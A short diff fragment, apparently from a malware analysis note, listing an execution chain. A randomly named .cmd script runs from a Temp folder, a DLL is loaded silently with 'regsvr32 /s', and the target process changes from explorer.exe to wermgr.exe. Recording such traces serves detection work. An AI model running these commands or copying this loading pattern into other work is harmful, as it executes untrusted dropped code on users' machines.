@@ -23,7 +23,7 @@ cmd /c "C:\Users\Admin\AppData\Local\Temp\breezily\reaganAsquith.cmd"
 
 regsvr32 /s C:\Users\Admin\AppData\Local\Temp\breezily\torpors.dll
 
-explorer.exe
+wermgr.exe
 
 *************************************************
 
